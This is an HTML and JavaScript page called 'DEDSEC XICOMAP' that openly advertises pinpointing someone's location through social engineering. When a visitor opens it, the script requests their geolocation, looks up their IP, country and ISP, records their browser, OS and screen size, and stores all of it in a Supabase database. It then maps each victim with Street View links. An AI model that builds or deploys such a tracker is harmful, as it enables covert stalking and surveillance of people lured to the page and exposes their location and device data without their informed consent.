<!DOCTYPE html>
<html>
<head>
    <title>Visitor Tracking Map</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Leaflet CSS and JS -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
          integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY="
          crossorigin=""/>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
            integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo="
            crossorigin=""></script>
    
    <!-- Supabase -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

    <style>
        body {
            margin: 0;
            padding: 20px;
            background-color: #000000;
            color: #00ff00;
            font-family: 'Courier New', monospace;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        h1 {
            color: #00ff00;
            font-size: 2em;
            text-align: center;
            margin-bottom: 20px;
            font-family: 'Courier New', monospace;
        }

        .subtitle {
            color: #00ff00;
            text-align: center;
            font-size: 0.9em;
            margin-bottom: 30px;
        }

        #map {
            height: 70vh;
            width: 100%;
            border: 1px solid #00ff00;
            margin-bottom: 20px;
            background: #000000;
        }

        .map-modes {
            display: flex;
            gap: 5px;
            justify-content: center;
            margin: 10px 0;
        }

        .map-mode-button {
            background-color: #000000;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 3px 8px;
            font-size: 11px;
            cursor: pointer;
        }

        .map-mode-button:hover {
            background-color: #00ff00;
            color: #000000;
        }

        .visitor-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            font-size: 12px;
        }

        .visitor-table th, .visitor-table td {
            border: 1px solid #00ff00;
            padding: 8px;
            text-align: left;
        }

        .visitor-table th {
            background-color: #001100;
        }

        .visitor-table tr:hover {
            background-color: #001100;
        }

        /* Custom map styles */
        .leaflet-container {
            background: #000000 !important;
        }

        .leaflet-control-layers,
        .leaflet-control-zoom {
            background: #000000 !important;
            border: 1px solid #00ff00 !important;
            color: #00ff00 !important;
        }

        .leaflet-control-attribution {
            background: rgba(0, 0, 0, 0.8) !important;
            color: #00ff00 !important;
            font-size: 8px !important;
            display: none !important;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>DEDSEC XICOMAP</h1>
        <div class="subtitle">PRECISELY PINPOINT SOMEONE'S LOCATION THROUGH THE ART OF SOCIAL ENGINEERING</div>
        
        <div id="map"></div>

        <div class="map-modes">
            <button class="map-mode-button">LIGHT MODE</button>
            <button class="map-mode-button">DARK MODE</button>
            <button class="map-mode-button">STREET MODE</button>
            <button class="map-mode-button">SATELLITE MODE</button>
            <button class="map-mode-button">HIGH-LOW</button>
        </div>

        <table class="visitor-table">
            <thead>
                <tr>
                    <th>LATITUDE</th>
                    <th>LONGITUDE</th>
                    <th>IP</th>
                    <th>OS</th>
                    <th>BROWSER</th>
                    <th>DEVICE TYPE</th>
                    <th>SCREEN</th>
                    <th>COUNTRY</th>
                    <th>ISP</th>
                    <th>TIME</th>
                    <th>PREVIEW</th>
                    <th>STREET VIEW</th>
                    <th>ZOOM</th>
                </tr>
            </thead>
            <tbody id="visitor-data">
            </tbody>
        </table>
    </div>

    <script type="module">
        import VisitorTracker from './tracker.js';
        
        document.addEventListener('DOMContentLoaded', function() {
            // Initialize map
            const map = L.map('map', {
                center: [12.8797, 121.7740],
                zoom: 6,
                minZoom: 5,
                maxZoom: 18
            });

            // Define map layers
            const layers = {
                'LIGHT MODE': L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}.png', {
                    attribution: 'UNDER MY CONTROL'
                }),
                'DARK MODE': L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}.png', {
                    attribution: 'UNDER MY CONTROL'
                }),
                'STREET MODE': L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: 'UNDER MY CONTROL'
                }),
                'SATELLITE MODE': L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
                    attribution: 'UNDER MY CONTROL'
                }),
                'HIGH-LOW': L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Topo_Map/MapServer/tile/{z}/{y}/{x}', {
                    attribution: 'UNDER MY CONTROL'
                })
            };

            // Set default layer
            layers['DARK MODE'].addTo(map);

            // Add click handlers for map mode buttons
            document.querySelectorAll('.map-mode-button').forEach(button => {
                button.addEventListener('click', (e) => {
                    const mode = e.target.textContent;
                    
                    // Remove current layer
                    map.eachLayer((layer) => {
                        if (layer instanceof L.TileLayer) {
                            map.removeLayer(layer);
                        }
                    });

                    // Add selected layer
                    if (layers[mode]) {
                        layers[mode].addTo(map);
                    }
                });
            });

            // Create tracker instance and pass the map
            const tracker = new VisitorTracker();
            tracker.map = map;  // Share the map instance
            
            // Custom marker icon
            const customIcon = L.divIcon({
                html: `<div style="
                    background-color: #00ff00;
                    width: 8px;
                    height: 8px;
                    border-radius: 50%;
                    border: 2px solid #ffffff;
                    box-shadow: 0 0 10px rgba(0,255,0,0.5);
                "></div>`,
                className: 'custom-marker',
                iconSize: [12, 12],
                iconAnchor: [6, 6]
            });

            // Add this new function to handle visitor tracking
            async function trackVisitor() {
                console.log('Starting visitor tracking...');
                if ("geolocation" in navigator) {
                    try {
                        navigator.geolocation.getCurrentPosition(async function(position) {
                            console.log('Got position:', position);
                            const lat = position.coords.latitude.toFixed(6);
                            const lng = position.coords.longitude.toFixed(6);

                            try {
                                // Get IP info
                                console.log('Fetching IP info...');
                                const ipResponse = await fetch('https://ipapi.co/json/');
                                const ipData = await ipResponse.json();
                                console.log('IP data:', ipData);

                                // Get device info
                                const deviceInfo = {
                                    os: navigator.platform,
                                    browser: navigator.userAgent,
                                    deviceType: /Mobile|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
                                    screen: `${window.screen.width}x${window.screen.height}`
                                };
                                console.log('Device info:', deviceInfo);

                                // Save to Supabase
                                console.log('Saving to Supabase...');
                                const { data, error } = await tracker.supabase
                                    .from('visitors')
                                    .insert([{
                                        latitude: lat,
                                        longitude: lng,
                                        ip_address: ipData.ip,
                                        country: ipData.country_name,
                                        isp: ipData.org,
                                        os: deviceInfo.os,
                                        browser: deviceInfo.browser,
                                        device_type: deviceInfo.deviceType,
                                        screen_resolution: deviceInfo.screen,
                                        visit_time: new Date().toISOString()
                                    }]);

                                if (error) throw error;

                                // Add marker to map
                                const marker = L.marker([lat, lng], {icon: customIcon}).addTo(map);
                                marker.bindPopup(`
                                    <div style="color: #00ff00; background: #000; padding: 5px;">
                                        <strong>Location:</strong> ${lat}, ${lng}<br>
                                        <strong>IP:</strong> ${ipData.ip}<br>
                                        <strong>Country:</strong> ${ipData.country_name}<br>
                                        <strong>ISP:</strong> ${ipData.org}
                                    </div>
                                `);

                                // Refresh visitor table
                                tracker.fetchVisitors();
                            } catch (error) {
                                console.error('Error tracking visitor:', error);
                            }
                        });
                    } catch (error) {
                        console.error('Error tracking visitor:', error);
                    }
                }
            }

            // Call trackVisitor when page loads
            trackVisitor();

            // Add click handlers for table buttons
            document.getElementById('visitor-data').addEventListener('click', function(e) {
                if (e.target.classList.contains('preview-button')) {
                    const row = e.target.closest('tr');
                    const lat = row.cells[0].textContent;
                    const lng = row.cells[1].textContent;
                    
                    // Add marker and center map
                    L.marker([lat, lng], {icon: customIcon}).addTo(map);
                    map.setView([lat, lng], 13);
                }
                else if (e.target.classList.contains('zoom-button')) {
                    const row = e.target.closest('tr');
                    const lat = row.cells[0].textContent;
                    const lng = row.cells[1].textContent;
                    
                    // Center map without marker
                    map.setView([lat, lng], 18);
                }
                else if (e.target.classList.contains('street-view-button')) {
                    const row = e.target.closest('tr');
                    const lat = row.cells[0].textContent;
                    const lng = row.cells[1].textContent;
                    
                    // Open Google Street View in new tab
                    window.open(`https://www.google.com/maps?layer=c&cbll=${lat},${lng}`);
                }
            });
        });
    </script>
</body>
</html>